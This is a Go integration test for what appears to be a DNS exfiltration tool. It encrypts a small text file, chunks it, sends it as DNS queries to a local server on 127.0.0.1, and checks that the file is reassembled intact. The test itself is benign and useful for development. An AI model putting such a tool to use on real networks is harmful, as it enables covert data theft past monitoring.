package main

import (
	"bytes"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/miekg/dns"
	"github.com/rcoop/dns-exfil/client"
	"github.com/rcoop/dns-exfil/server"
)

func TestIntegrationEndToEnd(t *testing.T) {
	baseDomain := "exfil.test.local"
	encKey := "integration-test-key"
	listenAddr := "127.0.0.1:15353"

	// Create a temp directory for output.
	outputDir := t.TempDir()

	// Create test file with known content.
	testContent := []byte("Hello from the DNS exfiltration integration test!\n" +
		"This is a multi-line file that will be encrypted, chunked,\n" +
		"sent over DNS queries, reassembled, decrypted, and verified.\n" +
		"If you can read this, it worked!\n")

	testFile := filepath.Join(t.TempDir(), "testfile.txt")
	if err := os.WriteFile(testFile, testContent, 0644); err != nil {
		t.Fatalf("writing test file: %v", err)
	}

	// Start server.
	store := server.NewSessionStore(5 * time.Minute)
	done := make(chan struct{})
	defer close(done)
	store.StartCleanup(10*time.Second, done)

	handler := &server.Handler{
		BaseDomain: baseDomain,
		Store:      store,
		Assembler: &server.Assembler{
			EncryptionKey: encKey,
			OutputDir:     outputDir,
		},
	}

	srv := &dns.Server{
		Addr:    listenAddr,
		Net:     "udp",
		Handler: handler,
	}

	go func() {
		if err := srv.ListenAndServe(); err != nil {
			// Server was shut down, this is expected.
		}
	}()
	defer srv.Shutdown()

	// Give the server a moment to start.
	time.Sleep(100 * time.Millisecond)

	// Chunk the file.
	cf, err := client.ChunkFile(testFile, encKey, baseDomain)
	if err != nil {
		t.Fatalf("ChunkFile: %v", err)
	}

	t.Logf("Chunks: %d, ChunkSize: %d bytes", len(cf.Chunks), cf.ChunkSize)

	// Send via client.
	sender := client.NewSender(client.SenderConfig{
		Resolver:    listenAddr,
		BaseDomain:  baseDomain,
		Concurrency: 5,
		Timeout:     2 * time.Second,
		MaxRetries:  3,
	})

	if err := sender.Send(cf); err != nil {
		t.Fatalf("Send: %v", err)
	}

	// Verify the output file.
	outputFile := filepath.Join(outputDir, "testfile.txt")
	received, err := os.ReadFile(outputFile)
	if err != nil {
		t.Fatalf("reading output file: %v", err)
	}

	if !bytes.Equal(received, testContent) {
		t.Errorf("content mismatch:\n  expected: %q\n  got:      %q", testContent, received)
	}

	t.Logf("Integration test passed: %d bytes transferred successfully", len(testContent))
}
